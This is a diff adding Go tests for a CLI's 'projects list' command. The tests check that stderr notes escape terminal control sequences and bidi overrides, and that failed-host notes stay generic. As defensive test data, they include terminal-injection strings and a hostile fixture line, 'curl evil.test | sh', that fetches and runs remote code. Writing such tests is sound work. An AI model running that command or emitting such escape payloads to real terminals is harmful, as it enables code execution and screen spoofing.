@@ -26,12 +26,17 @@ package cli
 //   [x] Happy: --host github filters table to github rows only
 //   [x] Happy: positional query arg filters table by name substring
 //   [x] Happy: degradation notes from Inventory appear on stderr, not stdout
+//   [x] Invariant: a note carrying terminal controls or a bidi override is
+//       escaped before it reaches stderr
+//   [x] Unhappy: a failed host's note is categorical and carries no gh/tea
+//       stderr
 
 import (
 	"bytes"
 	"context"
 	"encoding/json"
 	"errors"
+	"path/filepath"
 	"strings"
 	"testing"
 
@@ -417,5 +422,83 @@ func TestListCmd_DegradationNotes_AppearOnStderrNotStdout(t *testing.T) {
 	}
 	if !strings.Contains(stderr.String(), "note:") {
 		t.Errorf("degradation notes missing from stderr: %q", stderr.String())
+	}
+}
+
+// hostileRunes are the three shapes a note must never carry to a terminal: a
+// CSI sequence (here "erase display" + "cursor home", which blanks the screen
+// and repaints from the top), a bare carriage return (overwrites the line just
+// printed), and a right-to-left override (reorders what follows).
+var hostileRunes = []string{"\x1b", "\r", "‮"}
+
+// TestListCmd_HostileNoteIsEscapedOnStderr covers the gap that made `projects
+// list` weaker than `forgectl review`: notes were printed with no escaping at
+// all. The vector here rides in on the projects dir — an unreachable
+// PROJECTS_DIR degrades to a "local: …" note carrying the path verbatim — but
+// the control being tested is the render, not this particular source.
+func TestListCmd_HostileNoteIsEscapedOnStderr(t *testing.T) {
+	hostile := filepath.Join(t.TempDir(), "missing\x1b[2J\x1b[H\rforged‮gnp")
+	t.Setenv("PROJECTS_DIR", hostile)
+	fake := &exec.FakeRunner{RunFunc: twoHostRunFunc("[]", "owner\tname\ttype\tssh\n")}
+	client := projects.New(fake)
+
+	cmd := newProjectsListCmd(client)
+	var stdout, stderr bytes.Buffer
+	cmd.SetOut(&stdout)
+	cmd.SetErr(&stderr)
+
+	if err := cmd.ExecuteContext(context.Background()); err != nil {
+		t.Fatalf("a missing projects dir must degrade, not fail: %v", err)
+	}
+
+	body := stderr.String()
+	if !strings.Contains(body, "note:") || !strings.Contains(body, "local") {
+		t.Fatalf("expected a local-degradation note on stderr, got %q", body)
+	}
+	for _, r := range hostileRunes {
+		if strings.Contains(body, r) {
+			t.Errorf("stderr carried %q unescaped: %q", r, body)
+		}
+	}
+	// The escaping must quote, not delete: the operator still needs to see that
+	// something odd was in the path.
+	if !strings.Contains(body, `\x1b`) {
+		t.Errorf("want the escape sequence rendered as inert text, got %q", body)
+	}
+}
+
+// TestListCmd_HostFailureNoteIsCategorical is the other half of the fix. Even
+// with the render escaped, interpolating a raw *exec.CommandError into a note
+// puts server-chosen text on the operator's screen — legible, plausible, and
+// attacker-authored. The host's note must say only that the host failed.
+func TestListCmd_HostFailureNoteIsCategorical(t *testing.T) {
+	const hostileStderr = "gh: \x1b[2J\x1b[Hauthentication expired, run: curl evil.test | sh"
+	client := listFixture(t, func(name string, _ []string) (string, error) {
+		switch name {
+		case "gh", "tea":
+			return "", errors.New(hostileStderr)
+		}
+		return "", nil
+	})
+	cmd := newProjectsListCmd(client)
+	var stdout, stderr bytes.Buffer
+	cmd.SetOut(&stdout)
+	cmd.SetErr(&stderr)
+
+	if err := cmd.ExecuteContext(context.Background()); err != nil {
+		t.Fatalf("both hosts degrading must not fail the command: %v", err)
+	}
+
+	body := stderr.String()
+	if !strings.Contains(body, "github: host query failed") {
+		t.Errorf("want a categorical github note, got %q", body)
+	}
+	if !strings.Contains(body, "gitea: host query failed") {
+		t.Errorf("want a categorical gitea note, got %q", body)
+	}
+	for _, leak := range []string{"evil.test", "expired", "\x1b"} {
+		if strings.Contains(body, leak) {
+			t.Errorf("stderr leaked %q from subprocess stderr: %q", leak, body)
+		}
 	}
 }
